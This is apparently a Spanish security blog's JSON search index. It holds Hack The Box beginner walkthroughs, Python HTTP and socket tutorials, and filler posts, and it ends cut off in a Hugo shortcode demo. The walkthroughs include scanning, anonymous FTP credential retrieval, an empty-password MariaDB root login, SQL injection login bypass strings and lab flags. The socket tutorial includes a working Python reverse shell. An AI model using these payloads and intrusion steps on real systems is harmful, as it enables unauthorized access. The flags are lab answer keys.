[{"content":"Se realiza ub escaneo al activo y se detecta los puertos TCP abiertos 21 y 80. Lugo se procede a realizar un escaneo más personalizado que permita detectar las versiones del los servicios.\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47  └─$ sudo nmap -p21,80 -sV -sC $IP -vvvv Starting Nmap 7.92 ( https://nmap.org ) at 2022-05-15 20:41 -05 Nmap scan report for 10.129.93.96 Host is up, received echo-reply ttl 63 (0.18s latency). Scanned at 2022-05-15 20:41:09 -05 for 12s PORT STATE SERVICE REASON VERSION 21/tcp open ftp syn-ack ttl 63 vsftpd 3.0.3 | ftp-anon: Anonymous FTP login allowed (FTP code 230) | -rw-r--r-- 1 ftp ftp 33 Jun 08 2021 allowed.userlist |_-rw-r--r-- 1 ftp ftp 62 Apr 20 2021 allowed.userlist.passwd | ftp-syst: | STAT: | FTP server status: | Connected to ::ffff:10.10.14.83 | Logged in as ftp | TYPE: ASCII | No session bandwidth limit | Session timeout in seconds is 300 | Control connection is plain text | Data connections will be plain text | At session startup, client count was 4 | vsFTPd 3.0.3 - secure, fast, stable |_End of status 80/tcp open http syn-ack ttl 63 Apache httpd 2.4.41 ((Ubuntu)) |_http-favicon: Unknown favicon MD5: 1248E68909EAE600881B8DB1AD07F356 | http-methods: |_ Supported Methods: POST OPTIONS HEAD GET |_http-title: Smash - Bootstrap Business Template |_http-server-header: Apache/2.4.41 (Ubuntu) Service Info: OS: Unix NSE: Script Post-scanning. NSE: Starting runlevel 1 (of 3) scan. Initiating NSE at 20:41 Completed NSE at 20:41, 0.00s elapsed NSE: Starting runlevel 2 (of 3) scan. Initiating NSE at 20:41 Completed NSE at 20:41, 0.00s elapsed NSE: Starting runlevel 3 (of 3) scan. Initiating NSE at 20:41 Completed NSE at 20:41, 0.00s elapsed Read data files from: /usr/bin/../share/nmap Service detection performed. Please report any incorrect results at https://nmap.org/submit/ . Nmap done: 1 IP address (1 host up) scanned in 12.69 seconds Raw packets sent: 6 (240B) | Rcvd: 3 (116B)    Nos conectamos a nuestro objetivo a través del servido ftp. Se logea a través del usuario anonymous\n1 2 3 4 5 6 7 8  $ ftp $IP Connected to 10.129.93.96. 220 (vsFTPd 3.0.3) Name (10.129.93.96:kali): anonymous 230 Login successful. Remote system type is UNIX. Using binary mode to transfer files. ftp\u0026gt;   Se reevisa la información interna y se detecta credenciales. Se extrae la información\n1 2 3 4 5 6 7 8 9 10 11 12 13 14  ftp\u0026gt; get allowed.userlist local: allowed.userlist remote: allowed.userlist 229 Entering Extended Passive Mode (|||47545|) 150 Opening BINARY mode data connection for allowed.userlist (33 bytes). 100% |*************************************************************************************************| 33 1.87 KiB/s 00:00 ETA 226 Transfer complete. 33 bytes received in 00:00 (0.15 KiB/s) gftp\u0026gt; ge allowed.userlist.passwd local: allowed.userlist.passwd remote: allowed.userlist.passwd 229 Entering Extended Passive Mode (|||40266|) 150 Opening BINARY mode data connection for allowed.userlist.passwd (62 bytes). 100% |*************************************************************************************************| 62 6.25 KiB/s 00:00 ETA 226 Transfer complete. 62 bytes received in 00:00 (0.30 KiB/s)   Se realiza una enumeración de directorios y se detacta la ruta dashboard\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26  ─$ gobuster dir -u http://10.129.93.96 -w /usr/share/dirbuster/wordlists/directory-list-lowercase-2.3-medium.txt =============================================================== Gobuster v3.1.0 by OJ Reeves (@TheColonial) \u0026amp; Christian Mehlmauer (@firefart) =============================================================== [+] Url: http://10.129.93.96 [+] Method: GET [+] Threads: 10 [+] Wordlist: /usr/share/dirbuster/wordlists/directory-list-lowercase-2.3-medium.txt [+] Negative Status codes: 404 [+] User Agent: gobuster/3.1.0 [+] Timeout: 10s =============================================================== 2022/05/15 21:07:16 Starting gobuster in directory enumeration mode =============================================================== /assets (Status: 301) [Size: 313] [--\u0026gt; http://10.129.93.96/assets/] /css (Status: 301) [Size: 310] [--\u0026gt; http://10.129.93.96/css/] /js (Status: 301) [Size: 309] [--\u0026gt; http://10.129.93.96/js/] /fonts (Status: 301) [Size: 312] [--\u0026gt; http://10.129.93.96/fonts/] /dashboard (Status: 301) [Size: 316] [--\u0026gt; http://10.129.93.96/dashboard/] Progress: 6267 / 207644 (3.02%) ^C [!] Keyboard interrupt detected, terminating. =============================================================== 2022/05/15 21:09:20 Finished ===============================================================   Se ingresa al portal http://{IP}/dashboard y se detecta una portal de inicio de sesión.\nSe prueba las credenciales encontradas y bingo ! Se logra ingresar al sistema.\n","description":"Resolución del reto Crocodile de Hack The Box","id":2,"section":"posts","tags":["Exposición de datos","Fundamentos"],"title":"Crocodile","uri":"https://brp-rodriguez.github.io/es/posts/htb/crocodile/"},{"content":"TASK 1 What does the acronym SQL stand for? ANS: structured query language\nTASK 2 During our scan, which port running mysql do we find? Se realiza una escaneo con nmap y se detecta el puerto 3306 tcp abierto\n1 2 3 4 5 6 7  Nmap scan report for 10.129.30.80 Host is up (0.78s latency). Not shown: 999 closed tcp ports (conn-refused) PORT STATE SERVICE 3306/tcp open mysql Nmap done: 1 IP address (1 host up) scanned in 55.11 seconds   ANS 3306\nTASK 3 What community-developed MySQL version is the target running? Nos conectamos por telnet al host en el puerto 3306. Se fuerza un error y se detecta el uso de la tecnología MariaDB\n1 2 3 4 5 6 7 8 9 10  └─$ telnet $IP 3306 Trying 10.129.119.102... Connected to 10.129.119.102. Escape character is \u0026#39;^]\u0026#39;. help ls who select * from all; c 5.5.5-10.3.27-MariaDB-0+deb10u1IqQ}Dz\\\u0026gt;`��-��I+;\u0026amp;K*,?8:\\\u0026gt;mysql_native_password!#08S01Got packets out of orderConnection closed by foreign host.   ANS MariaDB\nSe realiza una búsqueda en internet de potenciales credenciales débiles y probamos un usuario conocido root con contraseña vacía\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50  ─$ mysql -u root -p -h $IP Enter password: Welcome to the MariaDB monitor. Commands end with ; or \\g. Your MariaDB connection id is 76 Server version: 10.3.27-MariaDB-0+deb10u1 Debian 10 Copyright (c) 2000, 2018, Oracle, MariaDB Corporation Ab and others. Type \u0026#39;help;\u0026#39; or \u0026#39;\\h\u0026#39; for help. Type \u0026#39;\\c\u0026#39; to clear the current input statement. MariaDB [(none)]\u0026gt; show databases; +--------------------+ | Database | +--------------------+ | htb | | information_schema | | mysql | | performance_schema | +--------------------+ 4 rows in set (0.193 sec) MariaDB [(none)]\u0026gt; use htb; Reading table information for completion of table and column names You can turn off this feature to get a quicker startup with -A Database changed MariaDB [htb]\u0026gt; show tables; +---------------+ | Tables_in_htb | +---------------+ | config | | users | +---------------+ 2 rows in set (0.195 sec) MariaDB [htb]\u0026gt; select * from config; +----+-----------------------+----------------------------------+ | id | name | value | +----+-----------------------+----------------------------------+ | 1 | timeout | 60s | | 2 | security | default | | 3 | auto_logon | false | | 4 | max_size | 2M | | 5 | flag | 7b4bec00d1a39e3dd4e021ec3d915da8 | | 6 | enable_uploads | false | | 7 | authentication_method | radius | +----+-----------------------+----------------------------------+ 7 rows in set (0.192 sec) MariaDB [htb]\u0026gt;    TASK 4 What switch do we need to use in order to specify a login username for the MySQL service? ANS: -u\nTASK 5 Which username allows us to log into MariaDB without providing a password? ANS: root\nTASK 6 What symbol can we use to specify within the query that we want to display everything inside a table? ANS: *\nTASK 7 What symbol do we need to end each query with? ANS: ;\nSUBMIT FLAG Como se observó en la tarea 3, se logró obtener el flag que se encontraba en la tabla config\nANS: 7b4bec00d1a39e3dd4e021ec3d915da8\nNotas:\nhttps://www.mysqltutorial.org/mysql-cheat-sheet.aspx\n","description":"Resolución del reto Sequel de Hack the box","id":3,"section":"posts","tags":["Weak-password","Fundamentos"],"title":"Sequel","uri":"https://brp-rodriguez.github.io/es/posts/htb/sequel/"},{"content":"TASK 1: What does the acronym SQL stand for? ANS: Structured Query language\nTASK 2: What is one of the most common type of SQL vulnerabilities? ANS: SQL injection\nTASK 3: What does PII stand for? ANS: personally identifiable information\nTASK 4: What does the OWASP Top 10 list name the classification for this vulnerability? ANS: A03:2021-Injection\nTASK 5: What service and version are running on port 80 of the target? ANS: Apache httpd 2.4.38 ((Debian))\nTASK 6: What is the standard port used for the HTTPS protocol? ANS: 443\nTASK 7: What is one luck-based method of exploiting login pages? ANS: brute-forcing\nTASK 8: What is a folder called in web-application terminology? ANS: directory\nTASK 9: What response code is given for \u0026ldquo;Not Found\u0026rdquo; errors? ANS: 404\nTASK 10: What switch do we use with Gobuster to specify we\u0026rsquo;re looking to discover directories, and not subdomains? ANS: dir\nTASK 11: What symbol do we use to comment out parts of the code? ANS: #\nSUBMIT FLAG: Submit root flag Ingresamos a la p+agina web expuesta http://{IP}:80\nEn el formulario de inicio de sesión injectamos una admin\u0026rsquo; or 1=1;#\no también podemos utilizar a\u0026rsquo; or \u0026lsquo;1\u0026rsquo;=\u0026lsquo;1 en los campos usuario y contraseña.\nANS: e3d0796d002a446c0e622226f42e9672\n","description":"Resolución del reto Appointment de Hack The Box","id":4,"section":"posts","tags":["SQL-Injection","Fundamentos"],"title":"Appointment","uri":"https://brp-rodriguez.github.io/es/posts/htb/appointment/"},{"content":"Algunos Módulos en Python para realizar peticiones\nProtocolo HTTP El protocolo HTTP es un canal de transferencia de datos de hyper-texto que no posee estado y que no almacena información. Debido a que no posee estado, se utiliza cookies para guardar información.\nEl protocolo HTTP define una serie de métodos para realizar consultas, entre estos se encuentran:\nGET. Pide una representación del recurso especificado. Por seguridad no debería ser usado por aplicaciones que causen efectos ya que transmite información a través de la URI agregando parámetros a la URL.\nHEAD. Pide una respuesta idéntica a la que correspondería a una petición GET, pero en la petición no se devuelve el cuerpo. Esto es útil para poder recuperar los metadatos de los encabezados de respuesta, sin tener que transportar todo el contenido.\nPOST. Envía los datos para que sean procesados por el recurso identificado. Los datos se incluirán en el cuerpo de la petición. Esto puede resultar en la creación de un nuevo recurso o de las actualizaciones de los recursos existentes o ambas cosas.\nCreando un cliente con httplib.client 1 2 3 4 5 6 7 8 9 10 11 12 13 14  import http.client import argparse parser = argparse.ArgumentParser(description=\u0026#39;obtener respuesta de un dominio\u0026#39;) parser.add_argument(\u0026#34;-target\u0026#34;, dest=\u0026#34;target\u0026#34;, help=\u0026#34;IP /dominio\u0026#34;, required=True) parsed_args = parser.parse_args() print(parsed_args.target) connection = http.client.HTTPConnection(parsed_args.target) connection.request(\u0026#34;GET\u0026#34;, \u0026#34;/\u0026#34;) data = connection.getresponse() print (data.code) print (data.headers) texto = data.readlines() print(texto)   Creando un cliente con urllib.request 1 2 3 4 5 6 7 8 9 10 11 12  import urllib.request try: response = urllib.request.urlopen(\u0026#34;http://www.python.org\u0026#34;) print(response.read().decode(\u0026#39;utf-8\u0026#39;)) response.close() except Exception as error: print(\u0026#34;Ocurrió un error\u0026#34;,error) except HTTPError as error: print(\u0026#34;Ocurrió un error\u0026#34;,error) except URLError as error: print(\u0026#34;Ocurrió un error\u0026#34;,error)   La función urlopen() devuelve un objeto de la clase http.client.HTTPResponse.\nCódigos de estado Los códigos de estado se clasifican en los siguientes grupos:\n100: informativo\n200: éxito\n300: redirección\n400: error del cliente\n500: error del servidor\nhttps://www.iana.org/assignments/http-status-codes/http-status-codes.xhtml\nManejo de excepciones con urllib.request 1 2 3 4 5 6 7 8 9 10 11 12  import urllib.error from urllib.request import urlopen try: urlopen(\u0026#39;https://www.ietf.org/rfc/rfc0.txt\u0026#39;) except urllib.error.HTTPError as e: print(\u0026#39;Exception\u0026#39;, e) print(\u0026#39;status\u0026#39;, e.code) print(\u0026#39;reason\u0026#39;, e.reason) print(\u0026#39;url\u0026#39;, e.url)    Impresi��n del emcabezado 1 2 3 4 5 6  import urllib.request url = input(\u0026#34;Introduce la URL:\u0026#34;) http_response = urllib.request.urlopen(url) print(\u0026#39;Código de estado: \u0026#39;+ str(http_response.code)) if http_response.code == 200: print(http_response.headers)   1 2 3 4 5 6 7 8 9  import urllib.request url = input(\u0026#34;Introduce la URL:\u0026#34;) http_response = urllib.request.urlopen(url) print(\u0026#39;Código de estado: \u0026#39;+ str(http_response.code)) if http_response.code == 200: print(http_response.info())    1 2 3 4 5 6 7 8  import urllib.request url = input(\u0026#34;Enter the URL:\u0026#34;) http_response = urllib.request.urlopen(url) if http_response.code == 200: print(http_response.headers) for key,value in http_response.getheaders(): print(key,value)\t   Modificando de el user-agent para consultar  Crear un objeto de solicitud(Request) A?adir cabeceras al objeto Request. Llamar al método urlopen() para enviar el objeto Request.  1 2 3 4 5 6 7 8 9  import urllib.request url = \u0026#34;http://www.python.org\u0026#34; #https://www.whatismybrowser.com/guides/the-latest-user-agent/chrome headers= {\u0026#39;User-Agent\u0026#39;: \u0026#39;Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.61 Safari/537.36\u0026#39;} request = urllib.request.Request(url,headers=headers) response = urllib.request.urlopen(request) print(\u0026#39;User-agent\u0026#39;,request.get_header(\u0026#39;User-agent\u0026#39;)) if response.code == 200: print(response.headers)   Obteniendo emails de la página principal de una web 1 2 3 4 5 6 7 8 9 10 11 12 13  import urllib.request import re web = input(\u0026#34;Introduce una url(sin http://): \u0026#34;) #https://www.adrformacion.com/ #obtener la respuesta response = urllib.request.Request(\u0026#39;http://\u0026#39;+web) #obtener el contenido de la página a partir de la respuesta content = urllib.request.urlopen(response).read() # expression regular para detectar emails pattern = re.compile(\u0026#34;[-a-zA-Z0-9._]+@[-a-zA-Z0-9_]+.[a-zA-Z0-9_.]+\u0026#34;) #obtener emails a partir de una expresi��n regular mails = re.findall(pattern,str(content)) print(mails)   1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17  from urllib.request import urlopen import re def download_page(url): return urlopen(url).read() def extract_links(page): link_regex = re.compile(\u0026#39;\u0026lt;a[^\u0026gt;]+href=[\u0026#34;\\\u0026#39;](.*?)[\u0026#34;\\\u0026#39;]\u0026#39;,re.IGNORECASE) return link_regex.findall(page) if __name__ == \u0026#39;__main__\u0026#39;: target_url = \u0026#39;http://www.adrformacion.com\u0026#39; content = download_page(target_url) links = extract_links(str(content)) for link in links: print(link)    Obteniendo imagenes 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18  from urllib.request import urlopen, urljoin import re def download_page(url): return urlopen(url).read() def extract_image_locations(page): img_regex = re.compile(\u0026#39;\u0026lt;img[^\u0026gt;]+src=[\u0026#34;\\\u0026#39;](.*?)[\u0026#34;\\\u0026#39;]\u0026#39;,re.IGNORECASE) return img_regex.findall(page) if __name__ == \u0026#39;__main__\u0026#39;: target_url = \u0026#39;https://www.adrformacion.com/\u0026#39; content = download_page(target_url) #print(content) image_locations = extract_image_locations(str(content)) print(image_locations) for src in image_locations: print(target_url, src)   urllib3 Una característica interesante es que le podemos indicar el número de conexiones que vamos a reservar para el pool de conexiones que estamos creando utilizando la clase PoolManager.\nEsta clase se encarga de gestionar la conexión de forma persistente y reutilizar las conexiones HTTP que va creando gracias a un pool de conexiones.\n1 2 3 4 5 6 7 8 9 10  import urllib3 pool = urllib3.PoolManager(10) response = pool.request(\u0026#39;GET\u0026#39;,\u0026#39;http://www.python.org\u0026#39;) print(response.status) print(\u0026#34;Keys\\n-------------\u0026#34;) print(response.headers.keys()) print(\u0026#34;Values\\n-------------\u0026#34;) print(response.headers.values()) for header,value in response.headers.items(): print(header + \u0026#34;:\u0026#34; + value)   Cliente HTTP con requests 1 2  import requests response = requests.get(\u0026#39;http://www.python.org\u0026#39;)    response.status_code: este es el código HTTP devuelto por el servidor. response.content: Aquí encontraremos el contenido de la respuesta del servidor. response.json(): en el caso de que la respuesta sea un JSON, este m��todo serializa la cadena y devuelve una estructura de diccionario con la estructura JSON correspondiente. En el caso de no recibir un JSON para cada respuesta, el m��todo devolver��a una excepci��n que podr��amos controlar  1 2 3 4 5 6 7 8 9 10 11 12  \u0026gt;\u0026gt;\u0026gt; response.status_code 200 \u0026gt;\u0026gt;\u0026gt; response.reason \u0026#39;OK\u0026#39; \u0026gt;\u0026gt;\u0026gt; response.url \u0026#39;http://www.python.org\u0026#39; \u0026gt;\u0026gt;\u0026gt; response.headers[\u0026#39;content-type\u0026#39;] \u0026#39;text/html; charset=utf-8\u0026#39; \u0026gt;\u0026gt;\u0026gt; response.request.headers {\u0026#39;User-Agent\u0026#39;: \u0026#39;python-requests/2.23.0\u0026#39;, \u0026#39;Accept-Encoding\u0026#39;: \u0026#39;gzip, deflate\u0026#39;, \u0026#39;Accept\u0026#39;: \u0026#39;*/*\u0026#39;, \u0026#39;Connection\u0026#39;: \u0026#39;keep-alive\u0026#39;}   Contando palabras 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24  import requests import sys import re def contar_palabras(url): try: fichero_url = f\u0026#39;{url}\u0026#39; response = requests.get(fichero_url) #print(response.text) texto = response.text sp = \u0026#39; |\\t|\\r|\\n\u0026#39; palabras = re.split(sp,texto) #print(palabras) return len(palabras) except requests.exceptions.HTTPError as e: print (\u0026#34;Http Error:\u0026#34;,e) except requests.exceptions.Timeout as e: print(\u0026#34;Timeout Error: \u0026#34;,e) except requests.exceptions.RequestException as e: print(\u0026#34;Error Desconocido: \u0026#34;,e) if __name__ == \u0026#34;__main__\u0026#34;: url = \u0026#34;ht.txt\u0026#34; num = contar_palabras(url) print(\u0026#34;Número de palabras :\u0026#34;,num)   Cabeceras de las peticiones 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16  import requests response = requests.get(\u0026#34;http://www.python.org\u0026#34;) print(response.content) print(\u0026#34;Status code: \u0026#34;+str(response.status_code)) print(\u0026#34;Cabeceras de respuesta: \u0026#34;) for header, value in response.headers.items(): print(header, \u0026#39;--\u0026gt;\u0026#39;, value) print(\u0026#34;Cabeceras de la peticion:\u0026#34;) for header, value in response.request.headers.items(): print(header, \u0026#39;--\u0026gt;\u0026#39;, value)    La instrucción response.headers proporciona las cabeceras de la respuesta del servidor web. Básicamente, la respuesta es un diccionario de objetos, y con el método items(), podemos iterar con el formato clave-valor para acceder a las diferentes cabeceras.\nVentajas del módulo requests El módulo requests facilita el uso de peticiones HTTP en Python en comparación con urllib. A menos que tenga un requisito para usar urllib, siempre recomendaría el uso de requests para sus proyectos en Python. Entre las principales ventajas del módulo de requests podemos destacar las siguientes:\nUna biblioteca enfocada en la creación de clientes HTTP completamente funcionales.\nSoporta todos los métodos y características definidos en el protocolo HTTP.\nEs \u0026ldquo;Pythonic\u0026rdquo;, es decir, está completamente escrito en Python y todas las operaciones se realizan de manera simple y con solo unas pocas líneas de código.\nTareas como la integración con servicios web, la creación de un pool de conexiones HTTP, la codificación de datos POST en formularios y el manejo de cookies, se manejan automáticamente.\nSe trata de una librería que implementa las funcionalidades de urllib3 y las extiende.\nGet API Rest 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21  import requests,json response = requests.get(\u0026#34;http://httpbin.org/get\u0026#34;,timeout=5) print(\u0026#34;Código de estado HTTP: \u0026#34; + str(response.status_code)) print(response.headers) if response.status_code == 200: results = response.json() for result in results.items(): print(result) print(\u0026#34;Cabeceras de la respuesta: \u0026#34;) for header, value in response.headers.items(): print(header, \u0026#39;--\u0026gt;\u0026#39;, value) print(\u0026#34;Cabeceras de la petición : \u0026#34;) for header, value in response.request.headers.items(): print(header, \u0026#39;--\u0026gt;\u0026#39;, value) print(\u0026#34;Server:\u0026#34; + response.headers[\u0026#39;server\u0026#39;]) else: print(\u0026#34;Error code %s\u0026#34; % response.status_code)   Ejercicio de consumir POST 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21  import requests data_dictionary = {\u0026#34;id\u0026#34;: \u0026#34;0123456789\u0026#34;} headers = {\u0026#34;Content-Type\u0026#34; :\u0026#34;application/json\u0026#34;,\u0026#34;Accept\u0026#34;:\u0026#34;application/json\u0026#34;} response = requests.post(\u0026#34;http://httpbin.org/post\u0026#34;,data=data_dictionary,headers=headers) print(\u0026#34;HTTP Status Code: \u0026#34; + str(response.status_code)) if response.status_code == 200: resultados = response.json() print(\u0026#34;Impresión de resultados formato linea por linea\u0026#34;) for res in resultados.items(): print(res) print(\u0026#34;Cabecera de la respuesta\u0026#34;) for header, value in response.headers.items(): print(header, \u0026#34; -\u0026gt; \u0026#34;, value) print(\u0026#34;Cabecera de la petición\u0026#34;) for header, value in response.request.headers.items(): print(header, \u0026#34; -\u0026gt; \u0026#34;, value) else: print(\u0026#34;HTTP code error %s\u0026#34; %res.status_code)   Consumo a través de proxy 1 2 3 4 5 6 7 8  proxy = {\u0026#34;protocol\u0026#34;:\u0026#34;ip:port\u0026#34;, ...} response = requests.get(url,headers=headers,proxies=proxy) import requests http_proxy = \u0026#34;http://\u0026lt;direccion_ip\u0026gt;:\u0026lt;puerto\u0026gt;\u0026#34; proxy_dictionary = { \u0026#34;http\u0026#34; : http_proxy} requests.get(\u0026#34;http://dominio.org\u0026#34;, proxies=proxy_dictionary)   Resumen En esta unidad hemos aprendido:\nEstablecer la conexión con un host con módulo http.client utilizando la clase http.client.HTTPConnection.\nEstablecer la conexión con un host con módulo urllib.request utilizando el método urlopen(), incluyendo la obtención del código de estado, cabeceras de la respuesta y de la petición a partir el objeto de respuesta response.\nObtener información de las cabeceras de la respuesta y de la petición de diferentes formas como utilizando los métodos info() y getheaders().\nPersonalizar las cabeceras que se envían en la petición a través del parámetro headers urllib.request.Request(url,headers=headers).\nExtraer información de una página web como enlaces e imágenes utilizando el módulo re para expresiones regulares.\nEstablecer la conexión con un host con módulo urllib3 utilizando la clase PoolManager.\nEstablecer la conexión con un dominio con módulo requests utilizando el método get(), incluyendo la obtención del código de estado, cabeceras de la respuesta y de la petición con el objeto de respuesta.\nRealizar una petición a una API Rest utilizando el módulo request a través de los métodos get() y post().\n","description":"Se muestra algunos módulos importantes en Python para realizar peticiones","id":5,"section":"posts","tags":["Python","Sockets","Modules-Python"],"title":"Módulos en Python Para Realizar Peticiones al Protocolo HTTP","uri":"https://brp-rodriguez.github.io/es/posts/modulos-en-python-para-realizar-peticiones/"},{"content":"Aplicaciones cliente-servidor usando sockets\nAlgunos métodos en Python para enviar y recibir datos socket.recv(buffer_long): Este método recibe datos del socket. El argumento del método indica la cantidad máxima de datos que puede recibir.\nsocket.recvfrom(buffer_long): Este método recibe datos y la dirección del remitente.\nsocket.recv_into(buffer): Este método recibe datos en un buffer.\nsocket.recvfrom_into(buffer): Este método recibe datos en un buffer.\nsocket.send(bytes): Este método envía datos de bytes al destino especificado.\nsocket.sendto(datos, dirección): Este método envía datos a una dirección determinada.\nsocket.sendall(datos): Este método envía todos los datos en el búfer.\nsocket.close(): Este método libera la memoria y finaliza la conexión\nAlgunos métodos para el socket en el servidor socket.bind(dirección): este método nos permite conectar la dirección con el socket, en necesario que previamente el socket se encuentre abierto antes de establecer la conexión con la dirección.\nsocket.listen(numero_conexiones): este método acepta como parámetro el número máximo de conexiones de los clientes TCP.\nsocket.accept(): este método nos permite aceptar conexiones del cliente. Este método devuelve dos valores: client_socket y la dirección del cliente. client_socket es un nuevo objeto de socket utilizado para enviar y recibir datos. Antes de usar este método, debe llamar a los métodos socket.bind(dirección) y socket.listen(numero_conexiones).\nAlgunos métodos para el socket en el cliente socket.connect(dirección_ip): este método conecta al cliente a la dirección IP del servidor.\nAlgunos métodos para capturar excepciones except socket.timeout: este bloque captura excepciones relacionadas con el vencimiento de los tiempos de espera.\nexcept socket.gaierror: este bloque detecta errores durante la búsqueda de información sobre direcciones IP, por ejemplo, cuando usamos los métodos getaddrinfo() y getnameinfo().\nexcept socket.error: este bloque detecta errores genéricos de entrada y salida y comunicación. Este es un bloque genérico donde puede detectar cualquier tipo de excepción.\nImplementando un servidor 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17  import socket s = socket.socket() s.bind((\u0026#34;localhost\u0026#34;, 9999)) s.listen(1) print(\u0026#34;servidor escuchando en el puerto 9999...\u0026#34;) sc, addr = s.accept() while True: recibido = sc.recv(1024) print(\u0026#34;Recibido del cliente el mensaje de: \u0026#34;, recibido.decode(\u0026#39;utf-8\u0026#39;)) mensaje_servidor = \u0026#34;Servidor recibió el mensaje de: \u0026#34; + recibido.decode(\u0026#39;utf-8\u0026#39;) sc.send(bytes(mensaje_servidor.encode(\u0026#39;utf-8\u0026#39;))) if recibido == bytes(\u0026#34;terminar\u0026#34;,\u0026#39;utf-8\u0026#39;): break print(\u0026#34;cerrando el socket servidor\u0026#34;) sc.close() s.close()   Implementando un cliente 1 2 3 4 5 6 7 8 9 10 11 12  import socket s = socket.socket() s.connect((\u0026#34;localhost\u0026#34;, 9999)) while True: mensaje = input(\u0026#34;\u0026gt; \u0026#34;) #Console escibe s.send(bytes(mensaje.encode(\u0026#39;utf-8\u0026#39;))) data_server = s.recv(1024) print(data_server.decode(\u0026#39;utf-8\u0026#39;)) if mensaje == \u0026#34;terminar\u0026#34;: break print(\u0026#34;cerrando socket cliente\u0026#34;) s.close()   Shell reversa Una Shell inversa se trata de acción mediante la cual un usuario consigue acceder a la shell de un servidor externo. Por ejemplo, si estás trabajando en una fase de pentesting relacionada con post-explotación y te gustaría crear un script que se invoque en ciertos escenarios que automáticamente hará obtener un shell para acceder al sistema de ficheros de otra máquina, podríamos construir nuestra propia shell inversa en Python.\n1  nc -lvnp 45679   1 2 3 4 5 6 7 8 9 10  import socket import subprocess import os sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM) sock.connect((\u0026#34;127.0.0.1\u0026#34;, 45679)) os.dup2(sock.fileno(),0) os.dup2(sock.fileno(),1) os.dup2(sock.fileno(),2) shell_remote = subprocess.call([\u0026#34;/bin/sh\u0026#34;, \u0026#34;-i\u0026#34;]) proc = subprocess.call([\u0026#34;/bin/ls\u0026#34;, \u0026#34;-i\u0026#34;])   ","description":"Se muestra algunos ejemplos de cliente-servidor codificados en Python","id":6,"section":"posts","tags":["Python","Sockets","Cliente-Servidor"],"title":"Aplicaciones Clientes Servidor usando sockets en Python","uri":"https://brp-rodriguez.github.io/es/posts/aplicaciones-clientes-servidor-con-python/"},{"content":"Resumen de conceptos básicos de sockets en Python\nFundamentos de Sockets ¿Qué son los sockets? Entendamos los sockets como un canal de comunicación punto a punto entre un cliente y un servidor. Es representado mediante la instancia de una conección a una IP y puerto mediante un protocolo en específico. La finalidad de un socket es comunicar datos o procesos a través de la red.\nTipos de Sockets Hay dos tipos de sockets\n Sockets de flujo TCP (socket.SOCK_STREAM) Sockets de datagramas UDP (socket.SOCK_DGRAM)  Por un tema de simplicidad se ralizará mayor énfasis a los sockets de flujo TCP\nInstanciando sockets en Python En Python para crear un socket se utiliza el constructor scoket.socket() que puede tomar como parámetros adicionales la familia, tipo del flujo. El tipo de familia de direcciones del socket más usual es AF_INET (direcciones de IPv4), AF_INET6 (direcciones IPv6). También existen otras familias. Por ejemplo, AF_UNIX, AF_IPX, AF_IRDA, AF_BLUETOOTH, entre otros.\nCódigo 1 2 3 4 5 6 7 8 9 10 11  import socket sock1 = socket.socket(AF_INET,SOCK_STREAM) sock2 = socket.socket() \u0026#39;\u0026#39;\u0026#39; \u0026#34;sock1 y sock2\u0026#34; : Variables u objetos instanciados del socket \u0026#34;socket\u0026#34; : Llamada al módulo de socket \u0026#34;socket(AF_INET,SOCK_STREAM)\u0026#34; : Contructor del socket con parámetros \u0026#34;socket()\u0026#34; : Constructor sin parámetros \u0026#34;AF_INET\u0026#34; : Familia de direcciones IPv4 \u0026#34;SOCK_STREAM\u0026#34; : Tipo del flujo de la comunicación del socket \u0026#39;\u0026#39;\u0026#39;   ","description":"Breves conceptos de sockets con Python","id":7,"section":"posts","tags":["Python","Sockets"],"title":"Aprendiendo Sockets con Python","uri":"https://brp-rodriguez.github.io/es/posts/fundamenttos-con-sockets-python/"},{"content":"hola\n","description":"Titorial de la banca","id":8,"section":"posts","tags":["pan","pollo","pan con pollo","recetas","comidas"],"title":"Abc","uri":"https://brp-rodriguez.github.io/es/posts/abc/"},{"content":"El pan con pollo es una muestra de comida sustancial en el mundo latinoamericano de los pollos con papas con ensalada o con tomate blanco de alfarjor\nTitulo 1 Descripción de titulo 1\nTitulo 2 Subtitulo 1 Descripción de Subtitulo 2\nSubtitlo 2 Descripción de subtitulo 3\n","description":"Tutorial sobre cómo","id":9,"section":"posts","tags":["pan","pollo","pan con pollo","recetas","comidas"],"title":"Post Estructura ","uri":"https://brp-rodriguez.github.io/es/posts/pan-con-pollo/"},{"content":"Hugo ships with several Built-in Shortcodes for rich content, along with a Privacy Config and a set of Simple Shortcodes that enable static and no-JS versions of various social media embeds.\nYouTube Privacy Enhanced Shortcode   Twitter Simple Shortcode .twitter-tweet { font: 14px/1.45 -apple-system,BlinkMacSystemFont,\"Segoe UI\",Roboto,Oxygen-Sans,Ubuntu,Cantarell,\"Helvetica Neue\",sans-serif; border-left: 4px solid #2b7bb9; padding-left: 1.5em; color: #555; } .twitter-tweet a { color: #2b7bb9; text-decoration: none; } blockquote.twitter-tweet a:hover, blockquote.twitter-tweet a:focus { text-decoration: underline; }  “In addition to being more logical, asymmetry has the advantage that its complete appearance is far more optically effective than symmetry.”\n— Jan Tschichold pic.twitter.com/gcv7SrhvJb\n\u0026mdash; Graphic Design History (@DesignReviewed) January 17, 2019 Vimeo Simple Shortcode  .__h_video { position: relative; padding-bottom: 56.23%; height: 0; overflow: hidden; width: 100%; background: #000; } .__h_video img { width: 100%; height: auto; color: #000; } .__h_video .play { height: 72px; width: 72px; left: 